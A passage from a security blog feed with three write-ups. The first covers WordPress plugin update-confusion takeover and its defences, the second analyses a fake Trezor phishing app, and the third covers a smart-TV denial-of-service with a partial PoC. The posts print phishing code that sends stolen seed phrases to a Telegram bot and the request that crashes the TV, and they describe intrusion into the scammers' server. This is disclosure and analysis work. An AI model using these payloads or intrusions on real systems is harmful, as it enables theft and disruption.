<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>apt-get <span class="nb">install </span>subversion
<span class="nv">$ </span>svn co https://plugins.svn.wordpress.org/xml-rpc-settings wordpress/
<span class="nv">$ </span><span class="nb">cp </span>xml-rpc-settings/<span class="k">*</span> wordpress/.
<span class="nv">$ </span><span class="nb">cd </span>wordpress
<span class="nv">$ </span>svn add trunk/<span class="k">*</span>
<span class="nv">$ </span>svn ci <span class="nt">-m</span> <span class="s1">'feat(xml-rpc-settings): Add plugin files'</span>
</code></pre></div></div>

<p>Like that, I released the plugin; now, I had to wait until the WordPress Plugin Directory synced with SVN. After a while, I noticed a Wordfence Slack notification, telling me that it found a problem on a couple of websites and a new plugin update is available; bingo!</p>

<p><img src="/assets/img/2021/11/wordfence.png" alt="" /></p>

<p>I was able to hijack a plugin installed on a couple of websites. Although there isn’t any backdoor, actually you can check the plugin:</p>

<p>https://wordpress.org/plugins/xml-rpc-settings</p>

<p><img src="/assets/img/2021/11/xml_rpc_settings.png" alt="xml_rpc_settings.png" /></p>

<p>On the other hand, an attacker could now have a foothold into the website. Even worse, if the website admin enables automatic plugins updates, introduced in WordPress 5.5. That would allow the attacker to change plugin files anytime they wanted, without any user interaction.</p>

<h2 id="how-to-defend-yourself">How to defend yourself</h2>

<p>As this is essentially vulnerable by design, I wouldn’t expect the fix from the WordPress side. If you are a big enough company, you can contact them and get your trademark in the <code class="language-plaintext highlighter-rouge">$trademarked_slugs</code> list. Since uploading a “dummy” plugin to the registry is not allowed, one must find another way. You can follow a couple of recommendations to keep your site secured.</p>

<h3 id="protecting-themes">Protecting themes</h3>

<p>The theme slug is the name of the theme in lower case, with spaces replaced by a hyphen (-). It is also the folder name for the theme. The themes team can decline themes based on the name and request that the name is changed if they decide that the name is inappropriate or too similar to an existing theme or brand.</p>

<ul>
  <li>Theme names must not use: WordPress, Theme, Twenty*</li>
  <li>Spell “WordPress” correctly in all public-facing text: all one word, with both an uppercase W and P</li>
  <li>No violation of trademarks.</li>
</ul>

<p>That means that you can rename your custom theme in the following way: <code class="language-plaintext highlighter-rouge">theme-internal_name</code> to be on the safe side.</p>

<h3 id="protecting-plugins">Protecting plugins</h3>

<p>WordPress 5.8, released on July 20, 2021, introduced a new “Update URI” plugin header.</p>

<blockquote>
  <p>This allows third-party plugins to avoid accidentally being overwritten with an update of a plugin of a similar name from the WordPress.org Plugin Directory.</p>
</blockquote>

<p>It effectively gives the website maintainer an effective way to prevent the supply chain attack, as the internal plugin will never ask for updates.</p>

<p>The main PHP file should include the header comment <code class="language-plaintext highlighter-rouge">Update URI: false</code>, example:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="cd">/**
 * Plugin Name: Internal Plugin
 * Version:     1.0
 * Update URI:  false
 */</span>
</code></pre></div></div>

<p>You can read the full announcement here: <a href="https://make.wordpress.org/core/2021/06/29/introducing-update-uri-plugin-header-in-wordpress-5-8/">https://make.wordpress.org/core/2021/06/29/introducing-update-uri-plugin-header-in-wordpress-5-8/</a></p>

<p>If you can’t, for any legacy reasons, update to WordPress 5.8, and use the   <code class="language-plaintext highlighter-rouge">Update URI</code> mitigation, you still have some options:</p>

<p>The plugin slug can only contain lower case alphanumeric characters and dash as a delimiter. Some of the keywords are prohibited as well, which could help us in this case. That means that you can rename your custom plugins in the following ways:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">internal_plugin_name</code></li>
  <li><code class="language-plaintext highlighter-rouge">InternalPluginName</code></li>
  <li><code class="language-plaintext highlighter-rouge">wp-internal-plugin-name</code></li>
</ul>

<p>It is also possible to leverage a <a href="https://developer.wordpress.org/reference/hooks/upgrader_package_options/">hook</a> and write a custom update function, blocking the internal WP API call and replacing it with your own, similar to how a paid plugin offers custom updates from their servers.</p>

<p>Some plugins do that for you, for example, <a href="https://wordpress.org/plugins/stops-core-theme-and-plugin-updates/">Easy Updates Manager</a>, which allows you to block updates for specific plugins.</p>

<p>That being said, you should always create a fresh backup and read the changelog before updating any plugins.</p>

<h2 id="bug-bounty-hunting">Bug Bounty hunting</h2>

<p>Since I don’t have my own recon DB anymore, I dumped about 200k subdomains from <a href="https://chaos.projectdiscovery.io/#/">Chaos</a> (public HackerOne programs with bounties) and scanned them with <a href="https://github.com/projectdiscovery/httpx">httpx</a>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>httpx <span class="nt">-random-agent</span> <span class="nt">-l</span> chaos_all_hackerone.txt <span class="nt">-match-string</span> <span class="s2">"wp-content"</span> <span class="nt">-o</span> httpx_wordpress.txt
</code></pre></div></div>

<p>That resulted in approximately 427 WordPress websites. After verifying them with the Proof of Concept <code class="language-plaintext highlighter-rouge">wp_update_confusion.py</code> tool, I found 13 potential targets. That is not bad, considering the <code class="language-plaintext highlighter-rouge">[8.2 High](https://chandanbn.github.io/cvss/#CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:L)</code> severity.</p>

<p><img src="/assets/img/2021/11/severity.png" alt="severity.png" /></p>

<p>After carefully reading the policy of each bug bounty program, I found out that more than half (7) of the potential targets are out of scope. That’s a bummer, as some belong to well-known companies, and they will probably fix it anyway after I release this research.</p>

<p>Either way, I ended up submitting six reports. One of them is the VDP program (not offering bounties).</p>

<p><img src="/assets/img/2021/11/twitter.png" alt="twitter.png" /></p>

<p>https://twitter.com/vavkamil/status/1447160385954533378</p>

<p>After sharing the screenshot of redacted submitted reports with a #0day hashtag on Twitter, I received a message from <a href="https://twitter.com/naglinagli">@naglinagli</a> offering a collaboration. The offer was access to his extensive recon database to scan the host with my payload in exchange for splitting any future bug bounty payouts.</p>

<p>Since Nagli is usually in the top 5 researchers with the highest HackerOne reputation, I decided to take the offer. Mainly to see how many vulnerable websites might be there. Giving away 50% of potential bounties might be somewhat expensive, but I was pretty much done with the scan anyway.</p>

<p><img src="/assets/img/2021/11/h1_leaderboard.png" alt="h1_leaderboard.png" /></p>

<p>On the first try, we found more than twice as many vulnerable hosts as my previous scan attempt. I must say that the collaboration was awesome, I was impressed by how many high-profile targets he was able to find.</p>

<p>All in all, we submitted close the 25 reports. Unfortunately, a lot of them were closed as Informative. Some argued that their release process would not update the plugins, most likely thanks to CI/CD automation. Some didn’t understand the report, and some closed it because it was missing a clear Proof of Concept, arguing that it’s only a theoretical issue.</p>

<p><img src="/assets/img/2021/11/feedback.png" alt="feedback.png" /></p>

<p>But others appreciated the submission, applied a fix, and one company even awarded us with a bonus for the quality of the report. You can see example of the report here: <a href="https://hackerone.com/reports/1364851">https://hackerone.com/reports/1364851</a></p>

<p>We ended up with approximately $4k in bounties, but most importantly, we made the Internet a little bit safer. It was very eye-opening how many top tech and world-known companies were potentially affected.</p>

<hr />

<p><img src="/assets/img/2021/11/owasp.jpg" alt="talk" /></p>

<p>This research was presented as a talk at the <a href="https://vavkamil.cz/talks/">OWASP Czech Chapter meeting</a> on 25th November 2021.</p>

<h3 id="update">UPDATE:</h3>
<ul>
  <li><a href="https://galnagli.com/Wordpress_Plugin_Update_Confusion/">Blog post about the recond phase</a></li>
  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44223">Someone somehow requested a CVE-2021-44223 for this</a></li>
  <li><a href="https://make.wordpress.org/plugins/2021/11/29/please-dont-test-submitting-other-peoples-plugins/"><strong>Please don’t ‘test’ submitting other people’s plugins.</strong></a></li>
</ul>]]></content><author><name>vavkamil</name></author><category term="Ethical hacking" /><category term="Tools" /><category term="Bug bounty" /><category term="wordpress" /><category term="dependency confusion" /><category term="update confusion" /><category term="supply chain attack" /><summary type="html"><![CDATA[tl;dr: Like the novel “Dependency Confusion” supply chain attack, it is possible to take over internally developed WordPress plugins unclaimed on the wordpress.org registry. Updating the plugin might result in the RCE or installing a PHP backdoor. You can use wp_update_confusion.py to scan for potential targets. To protect your website, please read this announcement.]]></summary></entry><entry><title type="html">Analysis of the Fake Trezor Mobile Wallet app in the Play Store</title><link href="http://localhost:4000/blog/2021-04-14-analysis-of-the-fake-trezor-mobile-wallet-app-in-the-play-store/" rel="alternate" type="text/html" title="Analysis of the Fake Trezor Mobile Wallet app in the Play Store" /><published>2021-04-14T02:00:00+02:00</published><updated>2021-04-14T02:00:00+02:00</updated><id>http://localhost:4000/blog/analysis-of-the-fake-trezor-mobile-wallet-app-in-the-play-store</id><content type="html" xml:base="http://localhost:4000/blog/2021-04-14-analysis-of-the-fake-trezor-mobile-wallet-app-in-the-play-store/"><![CDATA[<p>tl;dr: I analyzed the fake Trezor Android application on Google Play Store, compromised the backend, and said hello to the developer.</p>

<hr />

<p>A story about a person losing 7.1 bitcoin worth ~$600,000 due to a fake “Trezor” app in the App Store <a href="https://www.washingtonpost.com/technology/2021/03/30/trezor-scam-bitcoin-1-million/">made the news</a> very recently. According to the article, five people have reported having cryptocurrency stolen by the fake Trezor app on iOS, for total losses worth $1.6 million.</p>

<p>I saw another fake Trezor app pop-up on Google Play Store yesterday. People on Reddit were downloading the app to see what it does and to warn others. That caught my attention because it’s generally not a good idea to install something like this blindly.</p>

<hr />

<h3 id="android-app">Android app</h3>

<p><img src="/assets/img/2021/04/google-play-store.png" alt="" title="google-play-store" /></p>

<p>The Play Store listing had an almost five-star rating, a couple of primarily fake reviews, and around ~500 downloads. It looked somewhat believable to the casual user.</p>

<p><img src="/assets/img/2021/04/play-store-reviews.png" alt="" title="play-store-reviews" /></p>

<p>I pulled the .apk file from Play Store and decompiled it. From the first look, it was not malware, which was good.</p>

<p><code class="language-plaintext highlighter-rouge">$ sha256sum mobile-wallet-trezor-io_1.0.apk 1cc9a9748ccd210fb8aa06b1ae5b48ca3805eed12c670818a75e833733376b7f</code></p>

<p>In the “/sources/com/rzor/p034tr/MainActivity.java” file on line 206, we could see this message:</p>

<p><code class="language-plaintext highlighter-rouge">MainActivity.this.mo4371l0("This app is created using an unauthorized copy of 'Website 2 APK Builder Pro' Software.", "Unauthorized App", "Shame on me!");</code></p>

<p>And on the line 1196:</p>

<p><code class="language-plaintext highlighter-rouge">this.f2862z = "https://sliu3err-restaurant.com";</code></p>

<p><img src="/assets/img/2021/04/website-passphrase.png" alt="" title="website-passphrase" /></p>

<p>So the Android application was just a WebView for the phishing website. The only functionality was to enter the 12/24 backup word phrase to connect the Trezor. Anyone who uses Trezor should know that you are never supposed to enter it anywhere, but sadly, people are still falling for it.</p>

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Warning to all Trezor owners using Android devices!<br /><br />This app is malicious and has no relation to Trezor or SatoshiLabs. Please, don&#39;t install it.<br /><br />Remember that you should never share your seed with anyone until your Trezor device asks you to do it! <a href="https://t.co/6C3iKfPDnR">pic.twitter.com/6C3iKfPDnR</a></p>&mdash; Trezor (@Trezor) <a href="https://twitter.com/Trezor/status/1351123945911705602?ref_src=twsrc%5Etfw">January 18, 2021</a></blockquote>
<script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

<hr />

<h3 id="server-compromise">Server compromise</h3>

<p>After getting access to the web server, just to look around and see how the backend works, I was surprised by how basic it was. In the “index.php” file was an IP logger:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$dir</span> <span class="o">=</span> <span class="s1">'vixrs'</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>	<span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
<span class="p">}</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">'Y-m-d'</span><span class="p">)</span><span class="mf">.</span><span class="s1">'.txt'</span><span class="p">;</span>
<span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">];</span>
<span class="nv">$browser</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">];</span>
<span class="nv">$ipInfo</span> <span class="o">=</span> <span class="nf">grabIpInfo</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]);</span>
<span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$dir</span><span class="mf">.</span><span class="s1">'/'</span><span class="mf">.</span><span class="nv">$file</span><span class="p">;</span>
<span class="nv">$url</span> <span class="o">=</span> <span class="s2">"http://</span><span class="nv">$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]</span><span class="s2">"</span><span class="p">;</span>
<span class="nv">$info</span> <span class="o">=</span> <span class="s1">'
 
===========================
IP: '</span><span class="mf">.</span><span class="nv">$ip</span> <span class="mf">.</span><span class="s1">'
Browser: '</span><span class="mf">.</span><span class="nv">$browser</span> <span class="mf">.</span><span class="s1">'
Ipinfo: '</span><span class="mf">.</span><span class="nv">$ipInfo</span> <span class="mf">.</span><span class="s1">'
Time: '</span><span class="mf">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">'d/m/Y H:i:s a'</span><span class="p">)</span><span class="mf">.</span><span class="s1">'
Filename: '</span><span class="mf">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_SELF'</span><span class="p">])</span><span class="mf">.</span><span class="s1">'
URL: '</span><span class="mf">.</span><span class="nv">$url</span><span class="mf">.</span><span class="s1">'
'</span><span class="p">;</span>
<span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$info</span><span class="p">,</span> <span class="no">FILE_APPEND</span><span class="p">);</span>

<span class="k">function</span> <span class="n">grabIpInfo</span><span class="p">(</span><span class="nv">$ip</span><span class="p">)</span>
<span class="p">{</span>

  <span class="nv">$curl</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>

  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="s2">"http://ipwhois.app/json/</span><span class="nv">$ip</span><span class="s2">"</span><span class="p">);</span>
  <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">TRUE</span><span class="p">);</span>

  <span class="nv">$returnData</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>

  <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>

  <span class="k">return</span> <span class="nv">$returnData</span><span class="p">;</span>

<span class="p">}</span>

<span class="nv">$ipJsonInfo</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$ipInfo</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>And in the “seed.php” file was the passphrase logger:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
    <span class="nv">$token</span> <span class="o">=</span> <span class="s2">"16308!REDACTED!NyZV60tUX5ptudhtnSLj_nBNdo"</span><span class="p">;</span>

    <span class="nv">$data</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"text"</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'seed'</span><span class="p">],</span><span class="s1">'chat_id'</span> <span class="o">=&gt;</span> <span class="s1">'-59!REDACTED!38'</span><span class="p">];</span>

    <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"https://api.telegram.org/bot</span><span class="nv">$token</span><span class="s2">/sendMessage?"</span> <span class="mf">.</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">);</span>
    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Essentially, when the victim installed the Android app and entered the Trezor seed passphrase, the Telegram bot immediately sent it to the encrypted group chat. And the scammers began the recovery phase to empty the cryptocurrency balance.</p>

<p>While having access to the Telegram API token, I invited myself to the chat group. Unfortunately, I or the bot couldn’t see previous messages, so all I could do was say hello to the scammer. Their name was “Pinern nuere” with the username “caerwe3423”.</p>

<p><img src="/assets/img/2021/04/telegram-conversation.png" alt="" title="telegram-conversation" /></p>

<p>There was nothing more to do, so I just disabled the bot, so it no longer could forward the passphrases and called it a night. In the morning, the fake app was no longer on Play Store, so mission accomplished.</p>

<hr />

<h3 id="statistics">Statistics</h3>

<p>Since I grabbed the IP logs from a couple of days, I can share some stats. The backend was reused for all the variations of the scam. Most of the hits were from phones, with a wide range of Android versions worldwide:</p>

<p><strong>Day one:</strong></p>

<ul>
  <li>63 unique IP addresses</li>
  <li>30 unique countries</li>
  <li>62  unique user agents</li>
</ul>

<p><strong>Day two:</strong></p>

<ul>
  <li>116 unique IP addresses</li>
  <li>44 unique countries</li>
  <li>104  unique user agents</li>
</ul>

<p><strong>Day three:</strong></p>

<ul>
  <li>373 unique IP addresses</li>
  <li>51 unique countries</li>
  <li>326  unique user agents</li>
</ul>

<p><strong>Day four:</strong></p>

<ul>
  <li>51 unique IP addresses</li>
  <li>20 unique countries</li>
  <li>52 unique user agents</li>
</ul>

<p><strong>Day five:</strong></p>

<ul>
  <li>10 unique IP addresses</li>
  <li>6 unique countries</li>
  <li>9 unique user agents</li>
</ul>

<p>I don’t know how many of them were compromised, but hopefully zero.</p>

<hr />

<h3 id="indicators-of-compromise">Indicators of compromise</h3>

<ul>
  <li>https://play.google.com/store/apps/details?id=com.rzor.tr</li>
  <li>
    <p>https://play.google.com/store/apps/details?id=com.tzr.trz2</p>
  </li>
  <li>hXXps://sliuerr-restaurant.com</li>
  <li>hXXps://sliu3rr-restaurant.com</li>
  <li>hXXps://sliu3err-restaurant.com</li>
</ul>]]></content><author><name>vavkamil</name></author><category term="Ethical hacking" /><category term="trezor" /><category term="bitcoin" /><category term="scam" /><category term="cryptocurrency" /><summary type="html"><![CDATA[tl;dr: I analyzed the fake Trezor Android application on Google Play Store, compromised the backend, and said hello to the developer.]]></summary></entry><entry><title type="html">Exploiting remote DoS vulnerability in my not-so-smart TV</title><link href="http://localhost:4000/blog/2021-03-11-exploiting-remote-dos-vulnerability-in-my-not-so-smart-tv/" rel="alternate" type="text/html" title="Exploiting remote DoS vulnerability in my not-so-smart TV" /><published>2021-03-11T01:00:00+01:00</published><updated>2021-03-11T01:00:00+01:00</updated><id>http://localhost:4000/blog/exploiting-remote-dos-vulnerability-in-my-not-so-smart-tv</id><content type="html" xml:base="http://localhost:4000/blog/2021-03-11-exploiting-remote-dos-vulnerability-in-my-not-so-smart-tv/"><![CDATA[<p>tl;dr: I found a remotely exploitable DoS vulnerability in my “smart” TV in less than <a href="https://twitter.com/vavkamil/status/1336088348113448960">two hours</a> after unboxing. I have released full details, including a 0-day PoC exploit.</p>

<hr />

<p>I bought myself a smart TV for Christmas. It’s the first TV which I ever owned, so I was quite excited about it, but at the same time, I didn’t want something fancy. It was hard to find something with 4k resolution without a camera/microphone and unnecessary functions, potentially increasing the attack surface. I ended up buying an ordinary one with YouTube &amp; Netflix support (<em><a href="https://www.strong.tv/en/products/ultra-hd/srt43ub6203">SRT 43UB6203 (43”/108 cm) - 10 bit</a></em>).</p>

<p><img src="/assets/img/2021/03/SRT-43UB6203.jpg" alt="" title="SRT 43UB6203" /></p>

<p>After unboxing and setting it up, the first thing which I did was a firmware update. The latest software version is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Current version: V8-MS586EU-LF1V104
Product name: 43D1901
Date: May 23 201908:38:07
</code></pre></div></div>

<hr />

<h3 id="recon">Recon</h3>

<p>After the update, I continued with an <strong>nmap</strong> scan to see which (if any) ports are exposed:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vavkamil@xexexe:~$ nmap -p- 10.10.10.249
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-07 19:05 CET
Nmap scan report for 10.10.10.249
Host is up (0.0064s latency).
Not shown: 65525 closed ports
PORT      STATE SERVICE
4123/tcp  open  z-wave
5978/tcp  open  ncd-diag-tcp
8989/tcp  open  sunwebadmins
51604/tcp open  unknown
52091/tcp open  unknown
54656/tcp open  unknown
55028/tcp open  unknown
55683/tcp open  unknown
55699/tcp open  unknown
61414/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
</code></pre></div></div>

<p>I don’t know if that’s normal or what I was even expecting, but I was more interested in looking into some web interface since I do mostly web security stuff. Unfortunately, after trying each IP:port combination in the browser, there wasn’t anything useful.</p>

<p>So I tried Burp Suite’s “<strong>Discovery content</strong>” scan from the “<em>Engagement tools</em>” section. Some ports were not responding at all, or there were some XML configs - most likely for the FastCast/Miracast feature (UPnP/1.0 AwoX/1.1) to cast YouTube videos from the phone. I then hit the jackpot and found what I was looking for, the “admin” panel without any authentication.</p>

<p><img src="/assets/img/2021/03/content-discovery.png" alt="" title="Burp Suite - Discovery content" /></p>

<hr />

<h3 id="exploitation">Exploitation</h3>

<p>Looking at the <strong>Media Renderer Administration</strong> web interface, I was confident that I found a command injection and possible RCE. It’s an endpoint to change <em>Friendly Name</em>, which is used to discover the TV and is visible during casting, and it says:</p>

<blockquote>
  <p><em>Note: You can use the <strong>%hostname%</strong> variable as a placeholder for the actual device hostname.</em></p>
</blockquote>

<p><img src="/assets/img/2021/03/media-renderer.png" alt="" title="Media Renderer Administration" /></p>

<p>I precisely followed the instructions and set the Friendly Name as <em>%hostname%</em>. To my surprise, it didn’t work, and the TV completely froze instead. The TV remote stopped working, and the whole thing became unresponsive. Even the hardware buttons at the bottom did nothing. At that point, I was pretty much disappointed, as I thought that I just bricked my one-hour-old television.</p>

<p>Only after unplugging the power cord to do the hard reset, it returned to normal. I continued messing up with the command injection payloads, but it ended up with a <strong>Denial of Service</strong> (DoS) every time. Just a note that after each restart, the web interface is listening on a different dynamic port (49152 - 65535), so one has to repeat the recon phase.</p>

<p>At that point, I summarized my notes and reached to a vendor via the contact form on their website.</p>

<hr />

<h3 id="proof-of-concept">Proof of Concept</h3>

<p>After a couple of days passed, I spent an evening writing a Proof of Concept to confirm that the issue is remotely exploitable. The first step was to determine the internal IP range. WebRTC leak didn’t work for me, but since I also own Philips Hue smart light bulbs, I decided to work with that. Thanks to the CORS “misconfiguration”, any website you visit can check the internal IP address of your Hue Bridge. You can see the <a href="https://gist.github.com/vavkamil/9b77125eb4b6c7ff971aa9fa6b62e7ba">source code</a> or PoC for that <a href="https://xss.vavkamil.cz/hue-cors.html">here</a>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vavkamil@xexexe:~$ curl -v -s https://discovery.meethue.com/
...
&lt; HTTP/2 200 
&lt; access-control-allow-credentials: true
&lt; access-control-allow-headers: Origin, X-Requested-With, Content-Type, Accept, X-Token, X-Bridge
&lt; access-control-allow-methods: GET, OPTIONS
&lt; access-control-allow-origin: *
&lt; cache-control: no-cache
&lt; content-type: application/json; charset=utf-8
&lt; content-length: 63
&lt; via: 1.1 google
&lt; alt-svc: clear
&lt; 
[{"id":"ecb5fafffe128375","internalipaddress":"10.10.10.253"}]
* Connection #0 to host discovery.meethue.com left intact
</code></pre></div></div>

<p>After discovering the internal IP range, we can leverage the fact that there is always a service listening on port 4123 and do a port scan for that. Thanks to the lack of X-Frame-Options, we can try to load each IP:port pair in an iframe. Unfortunately, the connection to port 4123 will hang out, but it will eventually load after 1:30 minutes (at least in Mozilla Firefox). We can either wait or use a timer on the iframe to detect that it’s loading.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vavkamil@xexexe:~$ curl http://10.10.10.249:4123
curl: (1) Received HTTP/0.9 when not allowed

vavkamil@xexexe:~$ telnet 10.10.10.249 4123
Trying 10.10.10.249...
Connected to 10.10.10.249.
Escape character is '^]'.

&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;root&gt;&lt;response&gt;true&lt;/response&gt;&lt;/root&gt;
</code></pre></div></div>

<p>Once we know the smart TV’s internal IP address, we have to scan all of its dynamic ports to find the <em>Media Renderer Administration</em>. I used the same technique, which is popular in the <a href="https://vavkamil.cz/2019/12/11/an-introduction-to-the-router-exploit-kits/">Router Exploit Kits</a>, loading the admin panel logo in the <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code> tag. Then it’s just a matter of sending one unauthenticated GET request to cause a <em>Denial of Service</em> until the power cord is unplugged:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://{IP:PORT}/web/admin/setFriendlyName?name=%hostname%
</code></pre></div></div>

<p>The <a href="https://gist.github.com/vavkamil/1b1c14702198dd721c4d478ac15d0ac0">Proof of Concept code</a> is very messy and could be optimized to be much faster, but it works :)</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;&lt;</span><span class="sr">/title</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/head</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Strong</span> <span class="nx">TV</span> <span class="nx">DoS</span> <span class="nx">exploit</span><span class="o">&lt;</span><span class="sr">/h1</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Proof</span> <span class="k">of</span> <span class="nx">Concept</span><span class="o">&lt;</span><span class="sr">/h2</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="dl">"</span><span class="s2">internal_ip</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Any</span> <span class="nx">internal</span> <span class="nx">IP</span><span class="p">:</span><span class="o">&lt;</span><span class="sr">/label</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">internal_ip</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">internal_ip</span><span class="dl">"</span> <span class="nx">autocomplete</span><span class="o">=</span><span class="dl">"</span><span class="s2">off</span><span class="dl">"</span> <span class="nx">onchange</span><span class="o">=</span><span class="dl">"</span><span class="s2">get_tv_ip()</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="dl">"</span><span class="s2">tv_ip</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Smart</span> <span class="nx">TV</span> <span class="nx">IP</span><span class="p">:</span><span class="o">&lt;</span><span class="sr">/label</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">tv_ip</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">tv_ip</span><span class="dl">"</span> <span class="nx">autocomplete</span><span class="o">=</span><span class="dl">"</span><span class="s2">off</span><span class="dl">"</span> <span class="nx">onchange</span><span class="o">=</span><span class="dl">"</span><span class="s2">scan_tv_ports()</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="dl">"</span><span class="s2">tv_port</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Smart</span> <span class="nx">TV</span> <span class="nx">Port</span><span class="p">:</span><span class="o">&lt;</span><span class="sr">/label</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text</span><span class="dl">"</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">tv_port</span><span class="dl">"</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">tv_port</span><span class="dl">"</span> <span class="nx">autocomplete</span><span class="o">=</span><span class="dl">"</span><span class="s2">off</span><span class="dl">"</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">This</span> <span class="nx">may</span> <span class="nx">take</span> <span class="nx">a</span> <span class="nx">couple</span> <span class="k">of</span> <span class="nx">minutes</span><span class="o">&lt;</span><span class="sr">/em</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">label</span> <span class="k">for</span><span class="o">=</span><span class="dl">"</span><span class="s2">web_admin</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Media</span> <span class="nx">Renderer</span> <span class="nx">Administration</span><span class="p">:</span><span class="o">&lt;</span><span class="sr">/label</span><span class="err">&gt;
